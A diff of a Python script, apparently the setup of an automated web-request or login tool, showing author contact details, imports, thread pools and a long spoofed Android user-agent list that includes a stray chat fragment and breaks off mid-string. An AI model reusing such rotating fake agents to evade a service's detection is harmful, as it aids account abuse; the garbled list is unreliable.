@@ -1,2622 +1,1612 @@
-W = '\033[97;1m'
+#!/usr/bin/python3
+#-*-coding:utf-8-*-
+# Made With ❤️ By Dapunta And XNSCODE Project
+# Update V1.6
+_auth01_ = 'Dapunta AR'
 
-R = '\033[91;1m'
+# Author : Dapunta Adyapaksi R.
+# Facebook (Dapunta Khurayra X)   : Facebook.com/Dapunta.Khurayra.X
+# Instagram (☬ 𝐀𝐧𝐨𝐧𝐲𝐦 𝟒𝟎𝟒 ☬)    : Instagram.com/ratya.anonym.id
+# Whatsapp (Dapunta Bot_Key)      : +6282245780524
+# YouTube (Xayonara.ID)           : Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA
 
-G = '\033[92;1m'
+# Recode SC Orang Itu Gak Keren Bro
+# Lu Gaakan Bisa Berkembang Kalau Skillu Cuma Recode
+# Gaada Yg Susah Selama Lu Mau Belajar & Berusaha
+# Jangan Sampai Lu Jual File Source Code Ini !
 
-Y = '\033[93;1m'
-
-B = '\033[94;1m'
-
-P = '\033[95;1m'
-
-C = '\033[96;1m'
-
-N = '\x1b[0m'
-
-import os
-
-try:
-
-	import requests
-
-except ImportError:
-
-	os.system("pip install requests")
-
- 
-
-try:
-
-	import concurrent.futures
-
-except ImportError:
-
-	os.system("pip install futures")
-
- 
-
-import os
-
-import sys
-
-import time
-
-import requests
-
-import random
-
-import platform
-
-import base64
-
-import subprocess
-
-from concurrent.futures import ThreadPoolExecutor
-
-import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
-
-try:
-
-	import rich
-
-except ImportError:
-
-	os.system('pip install rich')
-
-	time.sleep(1)
-
-	try:
-
-		import rich
-
-	except ImportError:
-
-		exit(' [×] Cant Install Rich Module, Try Manual Install (pip install rich)')
-
-from rich.table import Table as me
-
-from rich.console import Console as sol
-
-from bs4 import BeautifulSoup as sop
-
-from concurrent.futures import ThreadPoolExecutor as tred
-
-from rich.console import Group as gp
-
-from rich.panel import Panel as nel
-
-import base64
-
-from rich import print as cetak
-
-from rich.markdown import Markdown as mark
-
-from rich.columns import Columns as col
-
+### Import Module
+import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
+from random import randint
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from bs4 import BeautifulSoup as par
+from datetime import date
+from datetime import datetime
 from urllib.parse import quote
 
-# UA LIST
+### Perumpamaan Module & Syntax
+_req_ses_  = requests.Session()
+_req_get_  = requests.get
+_req_post_ = requests.post
+_js_lo_    = json.loads
+_dapunta_cici_    = print
+_cici_dapunta_    = input
+_dapunta_dapunta_ = open
+_cici_cici_       = exit
 
-#ugen2=open('frec.txt','r').read().splitlines()
+### Warna
+Z = "\x1b[0;90m" # Hitam
+P = "\x1b[0;97m" # Putih
+M = "\x1b[0;91m" # Merah
+H = "\x1b[0;92m" # Hijau
+K = "\x1b[0;93m" # Kuning
+B = "\x1b[0;94m" # Biru
+U = "\x1b[0;95m" # Ungu
+O = "\x1b[0;96m" # Biru Muda
 
-#ugen=open('m.txt','r').read().splitlines()
-
-ugen2=['Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser','Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser']
-
-ugen=['Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 1…', '[18.36, 15/3/2022] AOREC: Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SCV45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; en-au; SC-04L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N980F/N980FXXU1DUB5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N/KSU1FUCD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-G988B/G988BXXU7DUC7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-A8050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SC-42A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T597W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600FN/A600FNXXU6CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515F/A515FXXU2ATB1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN 6/128) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A013F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N935S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M205G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J530GM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A530F/A530FXXU4CSC6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T835) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935F/G935FXXS2DRAA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G920K/KKS3ETJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-C9000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J720M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; Pixel C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; NX659J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A102U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0; en-au; SAMSUNG SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-G550FY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-N9200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; FRD-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P615) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F/N970FXXS6EUA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-F700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; CPH2009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G980F/G980FXXU3ATFG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G973F/G973FXXS3BSL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F/G960FXXSDFTL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A908N/KSU3CTL3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS6BUA5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXU3BRL8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-J320FN/J320FNXXU0ARE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11 en-au;; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F/A515FXXU4DUB2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T725) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S111DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965N/KSU3FTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-F700U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXS3BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXS4BTG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-T827V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J260A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A307GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T585/T585XXS5CSH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G925K/KKU3ERG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.2; en-au; SAMSUNG SM-P905) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T307U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A405FN/A405FNXXS3BTI3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J330FN/J330FNXXU4CTH2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G950F/G950FXXSBDUA3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXUGCTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935W8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-C7000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A310F/A310FXXS5CTK1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-T805M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 